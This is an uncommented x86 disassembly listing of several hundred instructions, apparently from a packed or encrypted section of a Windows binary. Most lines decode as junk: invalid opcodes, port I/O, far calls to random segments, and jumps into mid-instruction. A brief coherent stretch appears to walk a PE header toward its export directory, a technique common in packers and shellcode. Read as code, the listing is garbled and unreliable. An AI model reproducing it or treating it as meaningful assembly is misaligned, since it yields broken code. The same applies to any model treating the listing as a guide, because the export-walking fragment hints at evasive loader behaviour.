  40846c:	(bad)  
  40846d:	leave  
  40846e:	jle    0x40849d
  408470:	mov    ecx,DWORD PTR [esi]
  408472:	mov    ds:0xd59f7380,eax
  408477:	mov    cl,0xa5
  408479:	dec    eax
  40847a:	shl    BYTE PTR [ecx-0x41],0x54
  40847e:	out    dx,eax
  40847f:	dec    esp
  408480:	and    eax,0xa48be375
  408485:	inc    BYTE PTR [eax]
  408487:	fdivr  QWORD PTR [eax-0x262b07bb]
  40848d:	call   0x5e58:0x76da74f2
  408494:	rcl    BYTE PTR [ebx],0x50
  408497:	mov    edx,0xb38aeeb8
  40849c:	jmp    0x408442
  40849e:	add    BYTE PTR [eax+0x48eca597],ch
  4084a4:	lds    edi,FWORD PTR fs:[esp+ebx*8+0xc]
  4084a9:	pop    ebx
  4084aa:	mov    esp,0x3bdbfe5f
  4084af:	and    al,0x72
  4084b1:	mov    cl,0xc2
  4084b3:	cli    
  4084b4:	popf   
  4084b5:	sti    
  4084b6:	dec    edi
  4084b7:	push   es
  4084b8:	test   al,0x4d
  4084ba:	adc    ecx,DWORD PTR [ecx+0xd]
  4084bd:	arpl   sp,bp
  4084bf:	mov    edx,0x39f058f0
  4084c4:	adc    BYTE PTR [ebp-0x350f6d1f],0xa6
  4084cb:	adc    BYTE PTR [ebp+0x2c81b769],dl
  4084d1:	fimul  WORD PTR [esi+0x201d5cc0]
  4084d7:	retf   
  4084d8:	fmul   QWORD PTR [eax+0x43]
  4084db:	mov    ah,ch
  4084dd:	fdiv   QWORD PTR ds:0x2972600d
  4084e3:	mov    ebp,0xa8250331
  4084e8:	cmp    cl,BYTE PTR [ebp-0x75895488]
  4084ee:	sub    eax,0xfe9419d4
  4084f3:	jl     0x4084b0
  4084f5:	inc    esi
  4084f6:	(bad)  
  4084f7:	std    
  4084f8:	call   0x1b27:0xd48c94ad
  4084ff:	js     0x4084be
  408501:	leave  
  408502:	or     DWORD PTR [eax+edi*2+0x5],ecx
  408506:	jne    0x4084b6
  408508:	pop    esp
  408509:	and    DWORD PTR [ecx+0x37],ebp
  40850c:	mov    ?,WORD PTR [edx+0x14]
  40850f:	push   eax
  408510:	push   eax
  408511:	or     al,0x58
  408513:	sub    eax,0xe48aeeaa
  408518:	jle    0x408536
  40851a:	call   0x8c0c6eaa
  40851f:	sub    ebx,DWORD PTR [edi+0x2289af9e]
  408525:	add    ecx,DWORD PTR [esi]
  408527:	add    al,BYTE PTR [edi+0x1b94950f]
  40852d:	xchg   ebx,eax
  40852e:	out    0x82,al
  408530:	pop    es
  408531:	das    
  408532:	xchg   ebx,eax
  408533:	test   ah,dl
  408535:	out    0xc1,al
  408537:	jg     0x408598
  408539:	pushw  cs
  40853b:	in     al,0x72
  40853d:	mov    ecx,0x1783fe5
  408542:	mov    ds:0x61fcfd34,al
  408547:	dec    esp
  408548:	test   eax,0x937e1049
  40854d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40854e:	out    0x93,eax
  408550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408551:	ss (bad) 
  408553:	cs cld 
  408555:	xchg   BYTE PTR [ecx],ch
  408557:	jecxz  0x4084e4
  408559:	or     eax,0x90b04371
  40855e:	xlat   BYTE PTR ds:[ebx]
  40855f:	xor    cl,BYTE PTR [ebp+0x46492dd]
  408565:	cmp    eax,0x8e023100
  40856a:	adc    al,0x15
  40856c:	call   0x4ef2:0xef45d772
  408573:	call   0xc89e:0x6303
  408579:	loopne 0x40853d
  40857b:	xchg   ecx,eax
  40857c:	aas    
  40857d:	ret    0x3f89
  408580:	rcl    ebx,0xc2
  408583:	push   eax
  408584:	daa    
  408585:	and    BYTE PTR [edx+ecx*4-0x1a],bl
  408589:	les    ebp,FWORD PTR [ecx-0x56]
  40858c:	inc    esp
  40858d:	cs pop ecx
  40858f:	lods   eax,DWORD PTR ds:[esi]
  408590:	push   esp
  408591:	nop
  408592:	xor    al,BYTE PTR [eax]
  408594:	cmc    
  408595:	aas    
  408596:	pop    edi
  408597:	sar    BYTE PTR [eax+eiz*1],1
  40859a:	sub    bh,BYTE PTR ds:0x1eae8934
  4085a0:	ss cmp al,0xf6
  4085a3:	sub    al,0x97
  4085a5:	ins    DWORD PTR es:[edi],dx
  4085a6:	je     0x4085b7
  4085a8:	(bad)  
  4085a9:	and    esp,ecx
  4085ab:	jle    0x4085f6
  4085ad:	and    DWORD PTR [ecx-0x58],edi
  4085b0:	and    eax,0x6c14e86f
  4085b5:	xchg   edi,eax
  4085b6:	adc    BYTE PTR cs:[esi-0x24a332f4],0x79
  4085be:	push   ecx
  4085bf:	mov    ebx,0x5d8815e6
  4085c4:	jo     0x408597
  4085c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c7:	pop    ds
  4085c8:	inc    edi
  4085c9:	jno    0x408582
  4085cb:	xchg   esp,eax
  4085cc:	cwde   
  4085cd:	mov    al,ds:0x32518cae
  4085d2:	into   
  4085d3:	hlt    
  4085d4:	pop    esi
  4085d5:	adc    esi,DWORD PTR [edi+0xe]
  4085d8:	enter  0x385,0xdf
  4085dc:	jb     0x408586
  4085de:	popa   
  4085df:	fs ja  0x408643
  4085e2:	ror    BYTE PTR [eax-0x59285e08],1
  4085e8:	cmp    edx,eax
  4085ea:	adc    ebp,esi
  4085ec:	sbb    eax,0x31c64b88
  4085f1:	lods   eax,DWORD PTR ds:[esi]
  4085f2:	(bad)  
  4085f4:	mov    edx,0x958e2ef1
  4085f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085fa:	rcr    DWORD PTR [edx],0xd5
  4085fd:	mov    bl,0x90
  4085ff:	jno    0x4085c9
  408601:	loop   0x4085aa
  408603:	clc    
  408604:	xchg   edi,eax
  408605:	pop    ss
  408606:	bound  edx,QWORD PTR [ebp-0x18]
  408609:	ss mov bh,0x72
  40860c:	dec    ecx
  40860d:	or     esi,esp
  40860f:	push   ds
  408610:	retf   
  408611:	push   ebx
  408612:	repnz add eax,0xa901d276
  408618:	dec    ecx
  408619:	ds add ah,cl
  40861c:	inc    esi
  40861d:	mov    ds:0x5a2cd83e,eax
  408622:	cmp    eax,0x25adcf9
  408627:	and    BYTE PTR [eax+0x4e],cl
  40862a:	dec    edx
  40862b:	fmul   DWORD PTR [ebx-0x2f]
  40862e:	push   ebx
  40862f:	loope  0x408649
  408631:	gs dec ecx
  408633:	mov    esp,0xf30b1a0b
  408638:	fwait
  408639:	add    al,0x9a
  40863b:	or     BYTE PTR [esi],0xd6
  40863e:	push   edx
  40863f:	adc    BYTE PTR [ebx+edx*2],al
  408642:	and    cl,BYTE PTR [eax]
  408644:	retf   
  408645:	out    0x35,eax
  408647:	dec    ebx
  408648:	imul   ecx,DWORD PTR [ebp+ecx*4-0x65],0x3229c908
  408650:	sbb    al,0x1
  408652:	push   esp
  408653:	fwait
  408654:	jnp    0x408665
  408656:	test   DWORD PTR [eax+eax*1],ecx
  408659:	add    BYTE PTR [eax],al
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xb07bf285
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [ecx],dl
  40869e:	jb     0x408645
  4086a0:	das    
  4086a1:	test   eax,0xc939259
  4086a6:	sub    eax,0x6fefe53c
  4086ab:	gs xchg ebx,eax
  4086ad:	pop    edx
  4086af:	popa   
  4086b0:	inc    esp
  4086b1:	ret    
  4086b2:	cs xchg dl,ch
  4086b5:	outs   dx,DWORD PTR ds:[esi]
  4086b6:	dec    BYTE PTR [edi-0x33abba45]
  4086bc:	xchg   DWORD PTR [ecx-0x76234876],ebp
  4086c2:	xor    eax,0x4956677f
  4086c7:	pop    esp
  4086c8:	and    cl,BYTE PTR [edx]
  4086ca:	mov    ebx,0x2a6b93c5
  4086cf:	(bad)  
  4086d0:	retf   0xc4a0
  4086d3:	inc    ebp
  4086d4:	lods   al,BYTE PTR ds:[esi]
  4086d5:	in     al,0xcf
  4086d7:	push   ebp
  4086d8:	xor    bl,BYTE PTR [eax+0x56f1ea75]
  4086de:	nop
  4086df:	hlt    
  4086e0:	pop    ds
  4086e1:	inc    edi
  4086e2:	stc    
  4086e3:	xchg   BYTE PTR [edi+ecx*4],dh
  4086e6:	in     al,dx
  4086e7:	fimul  DWORD PTR [ebx+0x35b773d2]
  4086ed:	jb     0x4086bf
  4086ef:	pop    esp
  4086f0:	push   ss
  4086f1:	std    
  4086f2:	sti    
  4086f3:	adc    DWORD PTR [eax],edi
  4086f5:	jmp    0x485735a7
  4086fa:	push   esp
  4086fb:	enter  0x6e98,0x9e
  4086ff:	cmp    dl,BYTE PTR [edx+0x2c]
  408702:	(bad)  
  408703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408704:	jmp    0xfc347ed
  408709:	arpl   WORD PTR [ecx+eax*2+0x426f7ba],sp
  408710:	loopne 0x4086da
  408712:	rol    DWORD PTR [edi-0x12],cl
  408715:	icebp  
  408716:	cli    
  408717:	jnp    0x408749
  408719:	in     eax,dx
  40871a:	rcr    cl,1
  40871c:	sahf   
  40871d:	std    
  40871e:	xor    edi,eax
  408720:	pop    esp
  408721:	cli    
  408722:	int3   
  408723:	lahf   
  408724:	mov    al,ds:0x873fbc63
  408729:	daa    
  40872a:	sbb    BYTE PTR [eax],0xec
  40872d:	outs   dx,DWORD PTR gs:[esi]
  40872f:	push   eax
  408730:	add    ch,bh
  408732:	sbb    DWORD PTR [ebp+ebp*4-0x4075359d],esi
  408739:	stos   BYTE PTR es:[edi],al
  40873a:	pop    esi
  40873b:	out    0x10,eax
  40873d:	bound  ebx,QWORD PTR [ebp-0x3b]
  408740:	out    dx,al
  408741:	fsubr  DWORD PTR [edi+0x40]
  408744:	add    bh,0x65
  408747:	stc    
  408748:	sahf   
  408749:	xor    BYTE PTR [ebx+0x6a759e01],ch
  40874f:	push   esp
  408750:	xchg   ecx,eax
  408751:	es ss mov bl,0x17
  408755:	lsl    edi,WORD PTR [eax+0x495681b3]
  40875c:	dec    ecx
  40875d:	push   ds
  40875e:	xor    edx,edi
  408760:	or     ch,BYTE PTR [ecx]
  408762:	xor    al,0x97
  408764:	xlat   BYTE PTR ds:[ebx]
  408765:	cmp    eax,0xfad2ef48
  40876a:	mov    cl,0xc5
  40876c:	loopne 0x4087a5
  40876e:	mov    esp,0x31802479
  408773:	shl    ecx,0x51
  408776:	mov    dl,ch
  408778:	jns    0x40876e
  40877a:	fcomp  QWORD PTR [esi-0x7b]
  40877d:	mov    ds:0x25173c17,eax
  408782:	into   
  408783:	inc    ebp
  408784:	mov    esi,0x47bf45ff
  408789:	mov    ds:0x5be1beb6,eax
  40878e:	push   ds
  40878f:	xor    eax,0x7879df9d
  408794:	mov    BYTE PTR [edx+eax*4-0x462c8a94],0x59
  40879c:	pusha  
  40879d:	dec    ecx
  40879e:	dec    edi
  40879f:	int    0x41
  4087a1:	int    0x61
  4087a3:	mov    ebp,0x4a2ed73a
  4087a8:	loope  0x4087ee
  4087aa:	and    BYTE PTR [edi+0x36],ch
  4087ad:	mov    ah,0xa1
  4087af:	xchg   BYTE PTR [edi],bl
  4087b1:	test   eax,0xd2870fa6
  4087b6:	and    eax,0x2cbae6be
  4087bb:	in     eax,0xcc
  4087bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087be:	pusha  
  4087bf:	sar    DWORD PTR [esi-0x77],1
  4087c2:	ret    
  4087c3:	addr16 cmp bl,bl
  4087c6:	sbb    BYTE PTR [esi-0x45c06604],ah
  4087cc:	fwait
  4087cd:	pop    esp
  4087ce:	pop    ecx
  4087cf:	dec    edx
  4087d0:	pop    es
  4087d1:	sub    BYTE PTR [esi+0x255fa5be],cl
  4087d7:	and    ch,BYTE PTR [edi+eiz*2]
  4087da:	test   cl,ah
  4087dc:	cmp    DWORD PTR [eax-0x1ba4a179],ecx
  4087e2:	dec    ebp
  4087e3:	inc    edx
  4087e4:	leave  
  4087e5:	test   al,0x46
  4087e7:	ret    
  4087e8:	ret    0xf9e1
  4087eb:	not    DWORD PTR [edx+0x49]
  4087ee:	cmp    dl,BYTE PTR [edi-0x75]
  4087f1:	int3   
  4087f2:	and    DWORD PTR [eax-0x28],0x69c0c386
  4087f9:	push   cs
  4087fa:	ss mov eax,eax
  4087fd:	inc    esp
  4087fe:	jae    0x408789
  408800:	sub    BYTE PTR [eax+edi*8-0x2cade4b8],cl
  408807:	lods   eax,DWORD PTR ds:[esi]
  408808:	pop    eax
  408809:	lock das 
  40880b:	add    DWORD PTR [edi],ecx
  40880d:	loope  0x40886b
  40880f:	adc    eax,esi
  408811:	add    ebp,DWORD PTR [ebx]
  408813:	in     al,0xbe
  408815:	popa   
  408816:	and    BYTE PTR [ebx+0x54d93200],ch
  40881c:	xchg   ecx,eax
  40881d:	jbe    0x4087d0
  40881f:	push   ebx
  408820:	push   ebp
  408821:	pop    esi
  408822:	call   0xa811:0x78e3fc4c
  408829:	sbb    al,bh
  40882b:	rcl    BYTE PTR [eax+0x7],cl
  40882e:	cli    
  40882f:	pop    esp
  408830:	xlat   BYTE PTR ds:[ebx]
  408831:	xchg   ecx,eax
  408832:	inc    edi
  408833:	pusha  
  408834:	sbb    BYTE PTR [edi],al
  408836:	mov    ?,WORD PTR [ebx]
  408838:	cmp    eax,DWORD PTR [bx+si-0x3a]
  40883c:	lock or BYTE PTR [ecx+0x6f0b80eb],dh
  408843:	sbb    dh,ch
  408845:	xchg   esp,eax
  408846:	aad    0x78
  408848:	mov    WORD PTR [eax+0x512b1b69],?
  40884e:	sub    ecx,DWORD PTR ds:0x15c0cb
  408854:	ja     0x4088a0
  408856:	out    0xf6,al
  408858:	xor    dl,0xb8
  40885b:	es mov edi,0xddce941d
  408861:	push   ebx
  408862:	enter  0x7a75,0x99
  408866:	ins    BYTE PTR es:[edi],dx
  408867:	gs fcom st(4)
  40886a:	sbb    BYTE PTR [edx],bl
  40886c:	xlat   BYTE PTR ds:[ebx]
  40886d:	fdivr  DWORD PTR [esi]
  40886f:	mov    esi,0xd67c4fab
  408874:	xchg   edi,eax
  408875:	or     al,0xe4
  408877:	sub    ebx,DWORD PTR [ecx-0x679ec826]
  40887d:	loop   0x408896
  40887f:	(bad)  
  408880:	cld    
  408881:	fsubp  st(1),st
  408883:	pop    ebx
  408884:	add    esp,DWORD PTR [esi+0x41]
  408887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408888:	dec    edx
  408889:	retf   0x2fdb
  40888c:	aas    
  40888d:	dec    edx
  40888e:	xlat   BYTE PTR ds:[ebx]
  40888f:	dec    ecx
  408890:	push   ebx
  408891:	int3   
  408892:	mov    eax,0xedd05489
  408897:	pushf  
  408898:	sbb    dh,BYTE PTR es:[esi+0x2ac8602d]
  40889f:	jl     0x4088e3
  4088a1:	inc    ecx
  4088a2:	pushf  
  4088a3:	xor    ah,cl
  4088a5:	push   cs
  4088a6:	add    al,0x80
  4088a8:	js     0x4088d8
  4088aa:	pop    eax
  4088ab:	addr16 xchg esp,eax
  4088ad:	bound  esi,QWORD PTR [ebx-0xc26aee]
  4088b3:	dec    ecx
  4088b4:	ret    
  4088b5:	cmp    edi,DWORD PTR [ecx-0x448b455b]
  4088bb:	outs   dx,BYTE PTR ds:[esi]
  4088bc:	pop    edx
  4088bd:	mov    cl,0xec
  4088bf:	aam    0x5
  4088c1:	aam    0xe7
  4088c3:	mov    ecx,0x85d007b5
  4088c8:	xchg   ebx,eax
  4088c9:	cmc    
  4088ca:	cmp    BYTE PTR [ebx],ah
  4088cc:	retf   0x6bc4
  4088cf:	jge    0x4088f3
  4088d1:	inc    edi
  4088d2:	or     edi,DWORD PTR [eax+0x1d47b3be]
  4088d8:	neg    ch
  4088da:	sbb    al,0xa4
  4088dc:	push   0xf163e87
  4088e1:	in     eax,dx
  4088e2:	dec    ebx
  4088e3:	add    BYTE PTR [ebx-0x1e],cl
  4088e6:	out    0x9d,al
  4088e8:	mov    ebx,0x48cc93e2
  4088ed:	in     al,0x16
  4088ef:	inc    esi
  4088f0:	fst    DWORD PTR [ebx]
  4088f2:	mov    ch,BYTE PTR [edi-0x2ebf58f6]
  4088f8:	adc    al,0xeb
  4088fa:	sbb    esi,DWORD PTR [ebx-0x29]
  4088fd:	jge    0x40888b
  4088ff:	inc    ecx
  408901:	ror    BYTE PTR [edi-0x7d3358f6],cl
  408907:	jo     0x408954
  408909:	jo     0x4088f0
  40890b:	xchg   ecx,eax
  40890c:	mov    bl,0x16
  40890e:	xchg   ecx,eax
  40890f:	call   FWORD PTR [edi+ecx*1+0x6f977fa4]
  408916:	fstp   DWORD PTR [edi+0x5e]
  408919:	shl    BYTE PTR [ebp+0x2c50adf2],0x8e
  408920:	int    0x1d
  408922:	xor    al,ah
  408924:	jmp    0xea9e01d2
  408929:	adc    eax,0x28b1630e
  40892e:	xor    DWORD PTR [ebx+0x1a68713],ebp
  408934:	pop    ss
  408935:	pop    esi
  408936:	sub    ah,ch
  408938:	or     esp,edi
  40893a:	or     edx,DWORD PTR [edx]
  40893c:	call   0x3275:0x1d89ec5e
  408943:	and    ecx,DWORD PTR [ecx-0x74]
  408946:	sub    DWORD PTR [ecx-0x5d6a3a78],esi
  40894c:	in     eax,0xcb
  40894e:	test   dl,dl
  408950:	push   edi
  408951:	nop
  408952:	pop    edi
  408953:	jmp    0xbb38273c
  408958:	jecxz  0x408920
  40895a:	sbb    DWORD PTR [eax+0x6b819ca8],ebp
  408960:	test   al,0x28
  408962:	lods   eax,DWORD PTR ds:[esi]
  408963:	and    DWORD PTR [ebx-0x5f1b1fe6],edi
  408969:	addr16 cmc 
  40896b:	push   esp
  40896c:	arpl   bx,bp
  40896e:	mov    BYTE PTR [esi-0x78],0x9f
  408972:	(bad)
  408975:	mov    eax,0x6d8761ff
  40897a:	fbld   TBYTE PTR [edx+0x67]
  40897d:	pop    ebp
  40897e:	jecxz  0x40892c
  408980:	xor    DWORD PTR [ecx-0x203850c7],0x9cf9c41e
  40898a:	mov    eax,0x5df64e4b
  40898f:	fld    DWORD PTR [esi+0x6bf5c833]
  408995:	out    0x82,eax
  408997:	ds cs xor cl,al
  40899b:	cmp    al,BYTE PTR [ebx+0x19]
  40899e:	pushf  
  40899f:	into   
  4089a0:	xor    ebp,DWORD PTR [ebp-0x12]
  4089a3:	in     al,dx
  4089a4:	jmp    0x4661b7e8
  4089a9:	fisttp DWORD PTR [esi]
  4089ab:	fnsave [ebx-0x2971bef9]
  4089b1:	cmp    cl,ch
  4089b3:	or     DWORD PTR [eax],eax
  4089b5:	aad    0x76
  4089b7:	int3   
  4089b8:	xor    al,0x17
  4089ba:	fisttp DWORD PTR [edx-0x28]
  4089bd:	xchg   edi,eax
  4089be:	enter  0xf942,0x1c
  4089c2:	out    0x1b,al
  4089c4:	call   DWORD PTR [ebx-0x657f04f9]
  4089ca:	jnp    0x408961
  4089cc:	ret    0xcb8e
  4089cf:	or     BYTE PTR [ebp+ecx*4+0x23be0e9e],dl
  4089d6:	sahf   
  4089d7:	std    
  4089d8:	rcr    DWORD PTR [ebp+0xfc789ce],1
  4089de:	das    
  4089df:	pusha  
  4089e0:	and    eax,0xc0b44a0d
  4089e5:	cmp    esi,esp
  4089e7:	sbb    WORD PTR [edx-0x4],cx
  4089eb:	fstp   TBYTE PTR [esp+esi*2+0x66]
  4089ef:	sbb    BYTE PTR [edi],bh
  4089f1:	cmp    eax,0xe8b94b70
  4089f6:	in     al,dx
  4089f7:	mov    al,0x6a
  4089f9:	jle    0x4089d8
  4089fb:	and    ah,BYTE PTR [edi-0x4f]
  4089fe:	dec    edi
  4089ff:	jge    0x408a5e
  408a01:	test   al,0x70
  408a03:	pop    edi
  408a04:	push   es
  408a05:	add    ebp,ebp
  408a07:	xor    esi,0x71
  408a0a:	sar    DWORD PTR [ebp+0x152d296d],1
  408a10:	int3   
  408a11:	adc    al,0xcb
  408a13:	xor    eax,0xbe1c5b99
  408a18:	add    esp,esi
  408a1a:	or     al,0xcc
  408a1c:	test   al,0x53
  408a1e:	nop
  408a1f:	ds jle 0x4089c2
  408a22:	lds    eax,FWORD PTR [edx]
  408a24:	ins    DWORD PTR es:[edi],dx
  408a25:	in     eax,dx
  408a26:	(bad)  
  408a27:	sbb    al,0x86
  408a29:	xlat   BYTE PTR ds:[ebx]
  408a2a:	adc    bh,BYTE PTR [edx+eax*1+0x3f]
  408a2e:	cmp    eax,0x5a3bd54e
  408a33:	fist   DWORD PTR [ebp+0x7ed19c4f]
  408a39:	add    esi,DWORD PTR [esi-0x1c233e74]
  408a3f:	mov    al,ds:0x7e999bb3
  408a44:	test   eax,0x135143c0
  408a49:	rcr    DWORD PTR [ecx+edx*8-0x7],cl
  408a4d:	and    ch,BYTE PTR [ebp-0x7f]
  408a50:	mov    ah,0xa4
  408a52:	pusha  
  408a53:	or     eax,0x65cf0593
  408a58:	mov    dl,0x56
  408a5a:	fisub  WORD PTR [ecx+0x24]
  408a5d:	(bad)  [ebx+0x4568b06]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	neg    DWORD PTR [eax+0x23]
  408a77:	stos   BYTE PTR es:[edi],al
  408a78:	mov    ch,0x57
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    BYTE PTR [eax-0x1f],cl
  408a82:	inc    esi
  408a83:	daa    
  408a84:	adc    esp,DWORD PTR [ecx]
  408a86:	leave  
  408a87:	mov    dl,0x33
  408a89:	inc    edi
  408a8a:	sbb    edx,DWORD PTR [esp+ebp*8-0x79]
  408a8e:	inc    edi
  408a8f:	jp     0x408aae
  408a91:	sub    eax,DWORD PTR [ebp+edx*2-0x78]
  408a95:	xchg   ebx,eax
  408a97:	cmp    eax,0x5ab80acf
  408a9c:	push   ebx
  408a9d:	stos   BYTE PTR es:[edi],al
  408a9e:	pop    es
  408a9f:	pop    edx
  408aa0:	arpl   WORD PTR [edx+ecx*2],sp
  408aa3:	push   edi
  408aa4:	call   0xf220:0x82e471c
  408aab:	cmp    DWORD PTR [ebx],edi
  408aad:	mov    edx,0x8904cf7c
  408ab2:	fisub  DWORD PTR [edi+eiz*4+0x63]
  408ab6:	pop    edi
  408ab7:	inc    edx
  408ab8:	mov    esi,0x2a2da133
  408abd:	mov    bl,0x1f
  408abf:	lahf   
  408ac0:	and    al,0x2c
  408ac2:	iret   
  408ac3:	adc    esp,DWORD PTR [ebx+0x46]
  408ac6:	push   0xa3c7c35d
  408acb:	add    BYTE PTR [eax],al
  408acd:	call   0xb574b1e9
  408ad2:	adc    al,0x3
  408ad4:	shr    DWORD PTR [ebx],1
  408ad6:	sbb    BYTE PTR [ecx],dl
  408ad8:	pop    ebx
  408ad9:	retf   
  408ada:	dec    ebx
  408adb:	xchg   ch,ah
  408add:	push   edi
  408ade:	jge    0x408a62
  408ae0:	dec    eax
  408ae1:	jl     0x408ab6
  408ae3:	mov    esp,0x483567d4
  408ae8:	into   
  408ae9:	mov    fs,WORD PTR [edx]
  408aeb:	mov    al,ds:0x82bce5c0
  408af0:	push   ebp
  408af1:	mov    ds:0xd301e047,al
  408af6:	mov    cl,0x51
  408af8:	xor    eax,DWORD PTR [edx]
  408afa:	add    al,BYTE PTR [esi+0x45]
  408afd:	popa   
  408afe:	mov    ebx,0x2003bcd7
  408b03:	(bad)  
  408b04:	or     ebx,esp
  408b06:	dec    eax
  408b07:	mov    ecx,0xaae7ad9d
  408b0c:	mov    ?,WORD PTR [esi]
  408b0e:	xchg   ebp,eax
  408b0f:	inc    edx
  408b10:	vunpckhpd ymm0,ymm3,YMMWORD PTR [edx]
  408b14:	xor    al,bh
  408b16:	jbe    0x408b64
  408b18:	xchg   esp,eax
  408b19:	pop    ss
  408b1a:	lds    esp,FWORD PTR [ebx+ebp*4]
  408b1d:	jae    0x408b03
  408b1f:	(bad)  
  408b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b21:	out    0x8f,al
  408b23:	push   ss
  408b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b25:	sbb    dl,cl
  408b27:	repnz pop esi
  408b29:	mov    ecx,0x47d38dcb
  408b2e:	pushf  
  408b2f:	jne    0x408aef
  408b31:	jmp    0xcac4f20a
  408b36:	into   
  408b37:	dec    esi
  408b38:	js     0x408b81
  408b3a:	clc    
  408b3b:	jmp    0x408b9c
  408b3d:	cmp    ecx,esp
  408b3f:	sar    BYTE PTR [eax],cl
  408b41:	fiadd  DWORD PTR [edi+edi*2+0x7b1a1c5a]
  408b48:	xor    al,0x5c
  408b4a:	jmp    0x408aeb
  408b4c:	mov    ds,ecx
  408b4e:	ja     0x408ae9
  408b50:	sar    BYTE PTR [edi+0x7e],cl
  408b53:	push   esp
  408b54:	jp     0x408b6a
  408b56:	and    ecx,DWORD PTR [edx-0x486a6262]
  408b5c:	adc    eax,0x4bcddd2c
  408b61:	or     bh,BYTE PTR [esi+0x66ddb568]
  408b67:	repz mov cl,0xc8
  408b6a:	(bad)  
  408b6b:	jb     0x408b61
  408b6d:	xor    DWORD PTR [eax],0x37
  408b70:	sti    
  408b71:	lea    eax,[esi-0x5c]
  408b74:	lds    ebp,FWORD PTR [esp+eiz*4]
  408b77:	retf   
  408b78:	jmp    0xc58f:0xf912e108
  408b7f:	xchg   edi,eax
  408b80:	mov    cl,0x53
  408b82:	inc    ecx
  408b83:	shl    BYTE PTR [ebx-0x22],1
  408b86:	xchg   ebp,eax
  408b87:	or     eax,0x9d970441
  408b8c:	xor    DWORD PTR [edx],esi
  408b8e:	scas   al,BYTE PTR es:[edi]
  408b8f:	pop    edx
  408b90:	call   0xdd79ea67
  408b95:	aaa    
  408b96:	adc    DWORD PTR [ecx-0xc00c9ff],ebp
  408b9c:	call   0x5cf7f3e4
  408ba1:	add    edx,ebx
  408ba3:	xchg   ebx,eax
  408ba4:	in     al,0x9d
  408ba6:	cmp    al,0xb1
  408ba8:	addr16 pop cx
  408bab:	test   DWORD PTR [edx-0x43],edx
  408bae:	in     al,0xad
  408bb0:	or     BYTE PTR [ecx-0x7f],cl
  408bb3:	push   es
  408bb4:	data16 sbb dl,BYTE PTR [ebp+0x39]
  408bb8:	jbe    0x408b80
  408bba:	das    
  408bbb:	mov    esi,0x8cd65448
  408bc0:	lods   al,BYTE PTR ds:[esi]
  408bc1:	mov    ebp,DWORD PTR [ecx-0x1a]
  408bc4:	adc    edx,ecx
  408bc6:	out    dx,eax
  408bc7:	or     edx,ecx
  408bc9:	xchg   esi,eax
  408bca:	add    eax,0x6dbd25d1
  408bcf:	clc    
  408bd0:	lods   eax,DWORD PTR ds:[esi]
  408bd1:	xor    cl,BYTE PTR [eax+ebx*8-0x6d]
  408bd5:	sar    DWORD PTR ds:0x864681d,cl
  408bdb:	scas   eax,DWORD PTR es:[edi]
  408bdc:	jge    0x408bca
  408bde:	outs   dx,DWORD PTR ds:[esi]
  408bdf:	out    0x27,al
  408be1:	mov    cs,edx
  408be3:	je     0x408bb3
  408be5:	pop    ss
  408be6:	and    eax,0xd8b949d8
  408beb:	hlt    
  408bec:	shl    BYTE PTR [esi+0x31],1
  408bef:	adc    dh,BYTE PTR [ebp+ebp*2-0x619756a8]
  408bf6:	mov    ah,0xe6
  408bf8:	gs leave 
  408bfa:	mov    edx,0x94c133f8
  408bff:	pop    ebp
  408c00:	inc    ebp
  408c01:	aaa    
  408c02:	rcr    DWORD PTR [edx-0x4f],cl
  408c05:	pop    ebx
  408c06:	push   cs
  408c07:	xor    DWORD PTR [eax-0x5c885e1b],eax
  408c0d:	cld    
  408c0e:	das    
  408c0f:	ret    
  408c10:	fwait
  408c11:	pop    ds
  408c12:	xor    dl,BYTE PTR ds:0x972fce77
  408c18:	push   edi
  408c19:	mov    ds:0x50ca7c0b,eax
  408c1e:	inc    esp
  408c1f:	push   esi
  408c20:	dec    edi
  408c21:	nop
  408c22:	dec    eax
  408c23:	sub    BYTE PTR [ebx-0x5e0418dd],0xfa
  408c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c2b:	jmp    0xbe16:0x86faa741
  408c32:	mov    edi,0x44bd8857
  408c37:	add    cl,BYTE PTR [esi-0x121cd31e]
  408c3d:	sahf   
  408c3e:	add    ch,BYTE PTR cs:[ebx-0x28457a81]
  408c45:	sbb    ebx,DWORD PTR [ecx+0x43]
  408c48:	mov    bl,0xf5
  408c4a:	mov    BYTE PTR [eax-0x4],0x44
  408c4e:	cmp    ebx,esi
  408c50:	adc    BYTE PTR [edi],ah
  408c52:	jecxz  0x408c60
  408c54:	mov    ah,BYTE PTR [ebp+0x3a911f02]
  408c5a:	aad    0xea
  408c5c:	stos   DWORD PTR es:[edi],eax
